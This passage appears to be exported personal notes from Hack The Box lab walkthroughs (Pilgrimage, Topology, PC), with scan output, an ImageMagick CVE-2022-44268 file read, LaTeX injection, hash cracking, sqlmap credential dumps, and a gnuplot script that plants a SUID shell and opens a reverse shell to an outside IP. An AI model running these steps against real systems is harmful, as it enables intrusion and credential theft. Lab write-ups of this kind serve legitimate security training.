        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 25.17 seconds</rich_text>
      </node>
      <node name="buster" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689323176" ts_lastsave="1689323563">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text> -x php              

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l        9w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/tmp">http://pilgrimage.htb/tmp</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/tmp/">http://pilgrimage.htb/tmp/</rich_text>
        <rich_text>
200      GET      186l      505w     4928c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/owl.css">http://pilgrimage.htb/assets/css/owl.css</rich_text>
        <rich_text>
200      GET        5l       27w     1031c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/popup.js">http://pilgrimage.htb/assets/js/popup.js</rich_text>
        <rich_text>
200      GET      178l      395w     5292c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/custom.js">http://pilgrimage.htb/assets/js/custom.js</rich_text>
        <rich_text>
302      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/dashboard.php">http://pilgrimage.htb/dashboard.php</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/login.php">http://pilgrimage.htb/login.php</rich_text>
        <rich_text>
200      GET       94l      234w     3576c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/custom.css">http://pilgrimage.htb/assets/css/custom.css</rich_text>
        <rich_text>
302      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/logout.php">http://pilgrimage.htb/logout.php</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text>
200      GET      171l      403w     6166c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/login.php">http://pilgrimage.htb/login.php</rich_text>
        <rich_text>
200      GET      171l      403w     6173c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/register.php">http://pilgrimage.htb/register.php</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets">http://pilgrimage.htb/assets</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/">http://pilgrimage.htb/assets/</rich_text>
        <rich_text>
200      GET     2349l     5229w    50334c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/templatemo-woox-travel.css">http://pilgrimage.htb/assets/css/templatemo-woox-travel.css</rich_text>
        <rich_text>
200      GET       11l      552w    57997c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/animate.css">http://pilgrimage.htb/assets/css/animate.css</rich_text>
        <rich_text>
200      GET        2l     1283w    86927c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/jquery/jquery.min.js">http://pilgrimage.htb/vendor/jquery/jquery.min.js</rich_text>
        <rich_text>
200      GET        7l      942w    60110c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/bootstrap/js/bootstrap.min.js">http://pilgrimage.htb/vendor/bootstrap/js/bootstrap.min.js</rich_text>
        <rich_text>
200      GET       15l     1928w   119998c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/isotope.min.js">http://pilgrimage.htb/assets/js/isotope.min.js</rich_text>
        <rich_text>
200      GET    16582l    60225w   485937c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/tabs.js">http://pilgrimage.htb/assets/js/tabs.js</rich_text>
        <rich_text>
200      GET     6805l    11709w   123176c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/fontawesome.css">http://pilgrimage.htb/assets/css/fontawesome.css</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/images">http://pilgrimage.htb/assets/images</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/images/">http://pilgrimage.htb/assets/images/</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css">http://pilgrimage.htb/assets/css</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/">http://pilgrimage.htb/assets/css/</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js">http://pilgrimage.htb/assets/js</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/">http://pilgrimage.htb/assets/js/</rich_text>
        <rich_text>
200      GET        7l     2223w   194705c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/bootstrap/css/bootstrap.min.css">http://pilgrimage.htb/vendor/bootstrap/css/bootstrap.min.css</rich_text>
        <rich_text>
200      GET      198l      494w     7621c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text>
200      GET      198l      494w     7621c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/index.php">http://pilgrimage.htb/index.php</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor">http://pilgrimage.htb/vendor</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/">http://pilgrimage.htb/vendor/</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/jquery">http://pilgrimage.htb/vendor/jquery</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/jquery/">http://pilgrimage.htb/vendor/jquery/</rich_text>
        <rich_text>
[####################] - 62s   240026/240026  0s      found:25      errors:0      
[####################] - 58s    30000/30000   521/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text> 
[####################] - 58s    30000/30000   519/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/tmp/">http://pilgrimage.htb/tmp/</rich_text>
        <rich_text> 
[####################] - 58s    30000/30000   518/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/">http://pilgrimage.htb/assets/</rich_text>
        <rich_text> 
[####################] - 57s    30000/30000   523/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/images/">http://pilgrimage.htb/assets/images/</rich_text>
        <rich_text> 
[####################] - 58s    30000/30000   521/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/css/">http://pilgrimage.htb/assets/css/</rich_text>
        <rich_text> 
[####################] - 57s    30000/30000   523/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/assets/js/">http://pilgrimage.htb/assets/js/</rich_text>
        <rich_text> 
[####################] - 57s    30000/30000   530/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/">http://pilgrimage.htb/vendor/</rich_text>
        <rich_text> 
[####################] - 56s    30000/30000   537/s   </rich_text>
        <rich_text link="webs http://pilgrimage.htb/vendor/jquery/">http://pilgrimage.htb/vendor/jquery/</rich_text>
      </node>
      <node name="nikto" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689323563" ts_lastsave="1689325964">
        <rich_text>nikto -h </rich_text>
        <rich_text link="webs http://pilgrimage.htb/">http://pilgrimage.htb/</rich_text>
        <rich_text>      
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.142.239
+ Target Hostname:    pilgrimage.htb
+ Target Port:        80
+ Start Time:         2023-07-14 04:26:09 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: </rich_text>
        <rich_text link="webs https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</rich_text>
        <rich_text>
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: </rich_text>
        <rich_text link="webs https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/">https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</rich_text>
        <rich_text>
+ /: Cookie PHPSESSID created without the httponly flag. See: </rich_text>
        <rich_text link="webs https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</rich_text>
        <rich_text>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /login.php: Admin login page/section found.
+ /.git/index: Git Index file may contain directory listing information.
+ /.git/HEAD: Git HEAD file found. Full repo details may be present.
+ /.git/config: Git config file found. Infos about repo details may be present.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7962 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-07-14 04:31:09 (GMT-4) (300 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested</rich_text>
      </node>
      <node name="exploit" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689325964" ts_lastsave="1689341418">
        <rich_text>there is .git in </rich_text>
        <rich_text link="webs http://pilgrimage.htb/.git/">http://pilgrimage.htb/.git/</rich_text>
        <rich_text>

use GitTools
./gitdumper.sh </rich_text>
        <rich_text link="webs http://pilgrimage.htb/.git/">http://pilgrimage.htb/.git/</rich_text>
        <rich_text> ../../git


then see files in git (maybe need git checkout .)

./magick -version 
'Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 </rich_text>
        <rich_text link="webs https://imagemagick.org">https://imagemagick.org</rich_text>
        <rich_text>
Copyright: (C) 1999 ImageMagick Studio LLC
License: </rich_text>
        <rich_text link="webs https://imagemagick.org/script/license.php">https://imagemagick.org/script/license.php</rich_text>
        <rich_text>
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)


google ImageMagick 7.1.0-49 exploit

git clone </rich_text>
        <rich_text link="webs https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC">https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h3">Usage:</rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h4">Installing dependencies:</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">1. $ apt-get install pngcrush imagemagick exiftool exiv2 -y</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h4">Change the filename you want to read below:</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">2. $ pngcrush -text a "profile" "/etc/passwd" </rich_text>
        <rich_text>hello.png


</rich_text>
        <rich_text scale="h4">Confirm everything worked perfectly</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">3. $ exiv2 -pS pngout.png</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h4">Trigger the PoC via convert or upload image to the vulnerable service:</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">4. $ convert pngout.png gopro.png</rich_text>
        <rich_text>
we dont do this, we upload file to the VM then download the shrunk file and then do:

convert 64b111102f656.png test.png


</rich_text>
        <rich_text scale="h4">View content of file was read:</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">5. $ identify -verbose </rich_text>
        <rich_text>test.png


'root:x:0:0:root:/root:/bin/bash\n
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n
bin:x:2:2:bin:/bin:/usr/sbin/nologin\n
sys:x:3:3:sys:/dev:/usr/sbin/nologin\n
sync:x:4:65534:sync:/bin:/bin/sync\n
games:x:5:60:games:/usr/games:/usr/sbin/nologin\n
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash\n
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n
_laurel:x:998:998::/var/log/laurel:/bin/false\n




IN GIT FOLDER we find :

find . | grep -Ri sqlite
login.php:  $db = new PDO('sqlite:/var/db/pilgrimage');
index.php:        $db = new PDO('sqlite:/var/db/pilgrimage');
register.php:  $db = new PDO('sqlite:/var/db/pilgrimage');
dashboard.php:  $db = new PDO('sqlite:/var/db/pilgrimage');


use exploit on /var/db/pilgrimage

decode result in cyberchef

emily:abigchonkyboi123


ssh emily@pilgrimage.htb
emily@pilgrimage.htb's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul 14 20:54:57 2023 from 10.10.14.22
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
emily@pilgrimage:~$
emily@pilgrimage:~$ cat user.txt 
fac4c18f240b53f1de8c0a19aca77a8b


run linpeas

interesting files
/usr/bin/write.ul
/usr/sbin/malwarescan.sh


emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done


we use pspy in  /var/www/pilgrimage.htb/shrunk/

</rich_text>
      </node>
    </node>
    <node name="Topology" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690539664" ts_lastsave="1691060196">
      <rich_text>10.129.133.236</rich_text>
      <node name="nmap" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690539674" ts_lastsave="1690540143">
        <rich_text># Nmap 7.94 scan initiated Fri Jul 28 06:24:15 2023 as: nmap -p- -sC -sV -oA nmap/all -v 10.129.133.236
Nmap scan report for 10.129.133.236
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
# Nmap done at Fri Jul 28 06:24:42 2023 -- 1 IP address (1 host up) scanned in 26.61 seconds</rich_text>
      </node>
      <node name="buster" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690540143" ts_lastsave="1690540484"/>
      <node name="user" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690540484" ts_lastsave="1690540660">
        <rich_text>from frontpage

lklein
vdaisley
dabrahams</rich_text>
      </node>
      <node name="vhosts" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690540660" ts_lastsave="1690543294">
        <rich_text>gobuster vhost -u </rich_text>
        <rich_text link="webs http://topology.htb">http://topology.htb</rich_text>
        <rich_text> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain  
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             </rich_text>
        <rich_text link="webs http://topology.htb">http://topology.htb</rich_text>
        <rich_text>
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/07/28 06:37:29 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.topology.htb Status: 401 [Size: 463]
Found: stats.topology.htb Status: 200 [Size: 108]



</rich_text>
        <rich_text link="webs http://latex.topology.htb/equation.php">http://latex.topology.htb/equation.php</rich_text>
      </node>
      <node name="exploit" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690543294" ts_lastsave="1690551643">
        <rich_text link="webs http://latex.topology.htb/">http://latex.topology.htb/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection</rich_text>
        <rich_text>

put dollar signs

$\lstinputlisting{/etc/passwd}$

vdaisley is a user in passwd

next do 

$\lstinputlisting{/var/www/dev/.htpasswd}$

vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

use hashcat

hashcat -m 1600 hash rockyou.txt 

$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20 



ssh vdaisley@10.129.133.236

vdaisley@topology:~$ id
uid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley)
vdaisley@topology:~$ whoami
vdaisley
vdaisley@topology:~$ cat user.txt 
835a826332c4ea6d4650a27014693148


run linpeas.sh


vdaisley@topology:/dev/shm$ ls /opt
gnuplot


</rich_text>
        <rich_text link="webs https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/</rich_text>
        <rich_text>


vdaisley@topology:/opt/gnuplot$ cat /dev/shm/test.plt 
system "cp /bin/bash /dev/shm/bash;chmod u+s /dev/shm/bash;cp /root/root.txt /dev/shm/root.txt;chmod 777 /dev/shm/root.txt"
system "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.47/9001 0&gt;&amp;1'"


cp test.plt /opt/gnuplot/

nc -lvnp 9001            
listening on [any] 9001 ...
^[[Dconnect to [10.10.14.47] from (UNKNOWN) [10.129.133.236] 45522
bash: cannot set terminal process group (40579): Inappropriate ioctl for device
bash: no job control in this shell
root@topology:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@topology:~# cd  
cd
root@topology:~# cat roo	
cat root.txt 
ce3bc28374905f4423a0df828420e076</rich_text>
      </node>
    </node>
    <node name="PC" unique_id="30" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690970786" ts_lastsave="1690970790">
      <node name="nmap" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690970790" ts_lastsave="1690971795">
        <rich_text># Nmap 7.94 scan initiated Wed Aug  2 06:08:34 2023 as: nmap -p- -sC -sV -oA nmap/all -v 10.129.130.68
Nmap scan report for 10.129.130.68
Host is up (0.033s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at </rich_text>
        <rich_text link="webs https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</rich_text>
        <rich_text> :
SF-Port50051-TCP:V=7.94%I=7%D=8/2%Time=64CA2BA0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06
SF:\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GenericL
SF:ines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetReq
SF:uest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPOp
SF:tions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSPR
SF:equest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPCC
SF:heck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVer
SF:sionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\x
SF:ff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"
SF:)%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\
SF:?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0
SF:\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05
SF:\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\
SF:?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\
SF:xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
SF:\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\
SF:xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0
SF:\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
# Nmap done at Wed Aug  2 06:10:47 2023 -- 1 IP address (1 host up) scanned in 132.74 seconds</rich_text>
      </node>
      <node name="exploit" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690971795" ts_lastsave="1690974083">
        <rich_text>google port 50051 exploit

</rich_text>
        <rich_text link="webs https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9">https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9</rich_text>
        <rich_text>

save the item getinfo request from burp to file and run sqlmap

sqlmap -r get.req --batch --dump

[06:34:50] [INFO] fetching entries for table 'accounts'
Database: &lt;current&gt;
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+


ssh sau@10.129.130.68  
sau@10.129.130.68's password: 
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
sau@pc:~$ 
sau@pc:~$ 
sau@pc:~$ whoami
sau
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau
sau@pc:~$ cat user.txt 
08f6ad66ef3951ad95792e5878c3ad04

run linpeas.sh

maybe CVE-2019-7304

or pyload

sau@pc:/tmp/pyLoad$ pwd
